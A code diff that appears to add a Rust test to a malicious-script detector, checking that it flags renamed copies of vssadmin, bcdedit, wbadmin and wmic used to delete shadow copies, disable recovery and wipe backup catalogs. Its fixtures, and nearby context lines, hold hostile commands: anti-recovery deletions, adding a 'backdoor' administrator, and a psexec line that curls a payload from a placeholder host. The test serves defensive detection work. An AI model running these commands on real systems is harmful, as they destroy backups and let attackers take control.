@@ -3426,6 +3426,52 @@ C:\Users\Public\nt.tmp localgroup Administrators backdoor /ADD
     }
 
     #[test]
+    fn copied_anti_recovery_aliases_emit_traits() {
+        let script = br#"copy C:\Windows\System32\vssadmin.exe C:\Users\Public\vs.tmp
+C:\Users\Public\vs.tmp delete shadows /all /quiet
+copy C:\Windows\System32\bcdedit.exe C:\Users\Public\bc.tmp
+C:\Users\Public\bc.tmp /set recoveryenabled no
+copy C:\Windows\System32\wbadmin.exe C:\Users\Public\wb.tmp
+C:\Users\Public\wb.tmp delete catalog -quiet
+copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp shadowcopy delete
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for target in [
+            r#"C:\Users\Public\vs.tmp"#,
+            r#"C:\Users\Public\bc.tmp"#,
+            r#"C:\Users\Public\wb.tmp"#,
+            r#"C:\Users\Public\wm.tmp"#,
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied anti-recovery alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        for action in [
+            "vssadmin-delete-shadows",
+            "bcdedit-recoveryenabled-no",
+            "wbadmin-delete",
+            "wmic-shadowcopy-delete",
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::AntiRecovery { action: a } if a == action
+                )),
+                "missing copied anti-recovery action {action}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
